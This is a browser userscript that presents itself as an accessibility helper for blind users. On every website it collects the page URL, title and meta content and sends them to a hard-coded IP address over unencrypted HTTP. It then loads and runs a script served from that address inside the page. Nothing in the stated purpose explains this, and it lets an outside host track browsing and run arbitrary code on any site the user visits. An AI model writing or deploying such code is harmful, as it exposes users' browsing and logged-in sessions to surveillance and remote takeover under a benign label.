// ==UserScript==
// @name        page-access-helper
// @namespace   PAHelper
// @description 优化盲人网页
// @include     *
// @version     1
// ==/UserScript==

(function() {
    var h = location.hash.replace('#', ''),
    m = document.getElementsByTagName('meta'),
    t = [],
    u;
    if (h == 'news' || h == 'common') {
        u = 'http://101.226.73.209:12005/access.js?refer=' + encodeURIComponent(location.href) + '&type=' + h;
    } else {
        if (!window.acHelper) {
            t.push(document.title);
            for (var i = 0, l = m.length, c; i < l; i++) {
                c = m[i].getAttribute('content');
                if (c) {
                    if (m[i].getAttribute('name') == 'keywords') {
                        t.unshift(c);
                    } else {
                        t.push(c);
                    }
                }
            }
            u = 'http://101.226.73.209:12005/access.js?refer=' + encodeURIComponent(location.href) + '&keyword=' + encodeURIComponent(t.join('|'));
        }
    }
	if(u) {
		var s = document.createElement('script');
		s.src = u;
		s.id = 'pahjs';
		document.getElementsByTagName('head')[0].appendChild(s);
	}
})();
